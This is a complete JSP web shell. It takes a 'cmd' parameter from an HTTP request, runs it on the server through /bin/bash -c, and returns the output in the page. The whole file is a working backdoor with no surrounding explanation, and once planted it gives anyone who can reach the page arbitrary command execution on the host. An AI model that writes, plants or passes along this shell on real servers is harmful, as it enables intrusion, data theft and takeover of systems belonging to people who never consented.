<%@ page import="java.io.*,java.util.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null && !cmd.isEmpty()) {
    String[] cmds = new String[]{"/bin/bash", "-c", cmd};
    Process p = Runtime.getRuntime().exec(cmds);
    Scanner sc = new Scanner(p.getInputStream()).useDelimiter("\\A");
    out.println("<pre>" + (sc.hasNext() ? sc.next() : "") + "</pre>");
}
%>
